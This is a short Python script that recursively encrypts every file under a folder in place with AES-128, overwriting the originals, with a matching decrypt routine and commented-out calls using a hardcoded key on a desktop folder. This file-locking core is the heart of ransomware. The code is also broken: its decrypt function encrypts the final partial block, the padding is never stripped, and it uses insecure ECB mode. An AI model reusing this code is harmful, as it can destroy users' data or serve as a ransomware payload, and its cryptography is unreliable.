import aes128
import string
import random
import os


def encrypt_disk(disk_path, key):
    for root, dirs, files in os.walk(disk_path, topdown=False):
        for name in files:
            write_output_file_path_data(os.path.join(root, name), encrypt_data(os.path.join(root, name), key))


def decrypt_disk(disk_path, key):
    for root, dirs, files in os.walk(disk_path, topdown=False):
        for name in files:
            write_output_file_path_data(os.path.join(root, name), decrypt_data(os.path.join(root, name), key))


# generate random key string
def generate_random_string(length):
    letters = string.ascii_uppercase + string.ascii_lowercase + string.digits
    rand_string = ''.join(random.choice(letters) for i in range(length))
    print("key:", rand_string)
    return rand_string


# get file bytes
def get_file_path_data(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
    return data


# rewrite file
def write_output_file_path_data(file_path, data):
    with open(file_path, 'wb') as new_data:
        new_data.write(bytes(data))


def encrypt_data(file_path, key):
    data = get_file_path_data(file_path)
    crypted_data = []
    temp = []
    for byte in data:
        temp.append(byte)
        if len(temp) == 16:
            crypted_part = aes128.encrypt(temp, key)
            crypted_data.extend(crypted_part)
            del temp[:]
    else:
        if 0 < len(temp) < 16:
            empty_spaces = 16 - len(temp)
            for i in range(empty_spaces - 1):
                temp.append(0)
            temp.append(1)
            crypted_part = aes128.encrypt(temp, key)
            crypted_data.extend(crypted_part)
    return crypted_data


def decrypt_data(file_path, key):
    data = get_file_path_data(file_path)
    decrypted_data = []
    temp = []
    for byte in data:
        temp.append(byte)
        if len(temp) == 16:
            decrypted_part = aes128.decrypt(temp, key)
            decrypted_data.extend(decrypted_part)
            del temp[:]
    else:
        if 0 < len(temp) < 16:
            empty_spaces = 16 - len(temp)
            for i in range(empty_spaces - 1):
                temp.append(0)
            temp.append(1)
            decrypted_part = aes128.encrypt(temp, key)
            decrypted_data.extend(decrypted_part)
    return decrypted_data


#encrypt_disk(r"C:\Users\user\Desktop\xx", "ogRXwxdEdpOvLCcp")

#decrypt_disk(r"C:\Users\user\Desktop\xx", "ogRXwxdEdpOvLCcp")
